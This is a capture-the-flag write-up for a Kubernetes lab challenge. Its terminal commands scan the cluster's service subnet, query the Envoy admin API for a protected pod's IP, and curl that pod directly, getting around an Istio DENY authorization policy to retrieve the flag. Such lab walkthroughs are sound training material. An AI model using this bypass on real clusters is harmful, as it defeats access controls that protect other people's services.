---
tags:
  - Kubernetes
  - Istio
  - Service-Mesh
title: K8S LAN Party - The Beauty and The Ist
description: Bypass Istio envoy sidecar for ignoring the authorization policy
reference: https://k8slanparty.com/challenge/4
---
## Challenge

Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don't abuse this power; use it responsibly and with caution.

## Solution

### 1. view the provided authorization policy spec

```yaml
apiVersion: security.istio.io/v1beta1 
kind: AuthorizationPolicy metadata: 
name: istio-get-flag 
namespace: k8s-lan-party 
spec: 
	action: DENY 
	selector: 
		matchLabels: app: "{flag-pod-name}" 
	rules: 
		- from: 
			- source: namespaces: ["k8s-lan-party"] 
		- to: 
			- operation: methods: ["POST", "GET"]
```

### 2. check if we can use `kubectl`

Nope.

```
root@wiz-k8s-lan-party:~# kubectl get pods
2025/05/23 16:21:57 Starlark failed to allocate 4GB address space: cannot allocate memory. Integer performance may suffer.
error: error loading config file "/home/player/.kube/config": open /home/player/.kube/config: permission denied
```

### 3. check if any neigbour services exist using dns scan

found `istio-protected-pod-service.k8s-lan-party.svc.cluster.local`.

```
root@wiz-k8s-lan-party:~# printenv
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
USER_ID=a9be83d1-2567-405d-83a8-583500445a50
HISTSIZE=2048
PWD=/home/player
HOME=/home/player
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
HISTFILE=/home/player/.bash_history
TMPDIR=/tmp
TERM=xterm-256color
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
KUBERNETES_SERVICE_HOST=10.100.0.1
KUBERNETES_PORT=tcp://10.100.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
HISTFILESIZE=2048
_=/usr/bin/printenv
root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.0.0/16
57460 / 65536 [-------------------------------------------------------------------------------------------------------->______________] 87.68% 970 p/s10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
65390 / 65536 [---------------------------------------------------------------------------------------------------------------------->] 99.78% 969 p/s10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
65536 / 65536 [----------------------------------------------------------------------------------------------------------------------] 100.00% 970 p/s
```


### 4. Try to send an HTTP request to `istio-pritected-pod-service`

Got `RBAC: access denied` as expected because of the above Istio authorization policy.

```
root@wiz-k8s-lan-party:~# curl 10.100.224.159
RBAC: access deniedroot@wiz-k8s-lan-party:~#
```

### 5. found we can view the host network

```
root@wiz-k8s-lan-party:~# ip addr | head
3584: host-415b7d@if3583: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether d6:f1:64:6c:83:a6 brd ff:ff:ff:ff:ff:ff link-netnsid 1788
    inet 192.168.14.252/31 scope global host-415b7d
       valid_lft forever preferred_lft forever
    inet6 fe80::d4f1:64ff:fe6c:83a6/64 scope link 
       valid_lft forever preferred_lft forever
3328: host-78f1cc@if3327: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fa:c2:c7:94:b2:f5 brd ff:ff:ff:ff:ff:ff link-netnsid 1660
    inet 192.168.13.252/31 scope global host-78f1cc
       valid_lft forever preferred_lft forever
root@wiz-k8s-lan-party:~# ip link | head
3584: host-415b7d@if3583: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether d6:f1:64:6c:83:a6 brd ff:ff:ff:ff:ff:ff link-netnsid 1788
3328: host-78f1cc@if3327: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether fa:c2:c7:94:b2:f5 brd ff:ff:ff:ff:ff:ff link-netnsid 1660
3072: host-e6e57a@if3071: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether 86:54:45:ba:f6:e4 brd ff:ff:ff:ff:ff:ff link-netnsid 1532
2816: host-09f082@if2815: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether b6:5f:ac:83:08:57 brd ff:ff:ff:ff:ff:ff link-netnsid 1404
2560: host-900450@if2559: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000
    link/ether 16:85:7d:18:e1:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 1276
```

### 6. Try `tcpdump`

Operation not permitted.

```
root@wiz-k8s-lan-party:~# tcpdump
tcpdump: host-415b7d: You don't have permission to capture on that device
(socket: Operation not permitted)
root@wiz-k8s-lan-party:~# sudo tcpdump
sudo: unable to resolve host wiz-k8s-lan-party: Name or service not known
sudo: unable to send audit message: Operation not permitted
tcpdump: host-415b7d: You don't have permission to capture on that device
(socket: Operation not permitted)
```

### 7. run `netstat` 

It seems we can call the istio xds service.

```
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     2635625458 ./var/run/secrets/workload-spiffe-uds/socket
unix  3      [ ]         STREAM     CONNECTED     2639217344 etc/istio/proxy/XDS
unix  3      [ ]         STREAM     CONNECTED     2635624260 
unix  3      [ ]         STREAM     CONNECTED     2639215287 
```

## 8. Try to send HTTP request with `PUT` method to pass the authorization policy

```
root@wiz-k8s-lan-party:~# curl -vvv -X PUT 10.100.224.159
*   Trying 10.100.224.159:80...
* Connected to 10.100.224.159 (10.100.224.159) port 80 (#0)
> PUT / HTTP/1.1
> Host: 10.100.224.159
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 501 Not Implemented
< server: envoy
< date: Fri, 23 May 2025 17:56:41 GMT
< content-type: text/html;charset=utf-8
< content-length: 496
< x-envoy-upstream-service-time: 2
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 501</p>
        <p>Message: Unsupported method ('PUT').</p>
        <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
    </body>
</html>
* Connection #0 to host 10.100.224.159 left intact
```

### 9. find the local IP of `istiod-protected-service` to bypass the envoy proxy by Istio Admin REST API

IP is `192.168.47.181:80`

```
root@wiz-k8s-lan-party:~# curl http://localhost:15000/clusters | grep istio-protected    
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::observability_name::outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_connections::4294967295
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_pending_requests::4294967295
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_requests::4294967295
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::default_priority::max_retries::4294967295
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_connections::1024
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_pending_requests::1024
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_requests::1024
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::high_priority::max_retries::3
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::added_via_api::true
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::eds_service_name::outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_active::0
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_connect_fail::0
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::cx_total::4
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_active::0
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_error::3
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_success::4
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_timeout::0
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::rq_total::7
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::hostname::
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::health_flags::healthy
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::weight::1
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::region::us-west-1
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::zone::us-west-1c
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::sub_zone::
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::canary::false
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::priority::0
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::success_rate::-1
outbound|80||istio-protected-pod-service.k8s-lan-party.svc.cluster.local::192.168.47.181:80::local_origin_success_rate::-1
```

### 10. Try to `curl 192.168.47.181:80`

```
root@wiz-k8s-lan-party:~# curl 192.168.47.181:80
wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}root@wiz-k8s-lan-party:~#
```